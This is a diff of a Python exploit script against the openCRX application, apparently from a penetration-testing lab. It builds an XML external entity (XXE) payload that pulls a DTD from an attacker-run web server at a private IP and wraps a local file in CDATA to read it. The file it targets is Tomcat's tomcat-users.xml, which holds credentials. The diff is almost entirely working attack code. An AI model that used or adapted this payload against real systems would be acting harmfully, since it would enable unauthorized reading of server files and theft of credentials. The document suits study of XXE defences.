@@ -185,18 +185,22 @@ def read_file(ip, session, username, password, filename):
 	print(f"Reading file contents of file {filename}")
 	print("Remember to make sure web-server is running")
 
+	with open("wrapper.dtd", "w") as f:
+		contents = ("<!ENTITY % start \"<![CDATA[\">\n"
+		f"<!ENTITY % file SYSTEM \"file://{filename}\" >\n"
+		"<!ENTITY % end \"]]>\">\n"
+		"<!ENTITY wrapper \"%start;%file;%end;\"\n>")
+		f.write(contents)
+
 	brkpoint = "hhhhhbreakpoint" # Unique word to sandwich output
-	xml = ("<?xml version=\"1.0\"?>"
-	"<!DOCTYPE data["
-	"<!ENTITY % start \"<![CDATA[\">"
-	f"<!ENTITY % file SYSTEM \"file://{filename}\" >"
-	"<!ENTITY % end \"]]>\">"
-	f"<!ENTITY % dtd SYSTEM \"http://{LHOST}/wrapper.dtd\" >"
-	"%dtd;"
-	"]>"
-	"<org.opencrx.kernel.account1.Contact>"
-	f"<lastName>{brkpoint}&wrapper;{brkpoint}</lastName>"
-	"<firstName>Tom</firstName>"
+	xml = ("<?xml version=\"1.0\"?>\n"
+	"<!DOCTYPE data[\n"
+	"<!ENTITY % dtd SYSTEM \"http://192.168.45.221/wrapper.dtd\" >\n"
+	"%dtd;\n"
+	"]>\n"
+	"<org.opencrx.kernel.account1.Contact>\n"
+	f"<lastName>{brkpoint}&wrapper;{brkpoint}</lastName>\n"
+	"<firstName>Tom</firstName>\n"
 	"</org.opencrx.kernel.account1.Contact>")
 	print(xml)
 
@@ -238,8 +242,9 @@ def main():
 
 	print("Logging in")
 	session = login(ip, username, password)
-
-	read_file(ip, session, username, password, "/home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml")
+	
+	filename = "/home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml"
+	read_file(ip, session, username, password, filename)
 
 if __name__ == '__main__':
 	main()
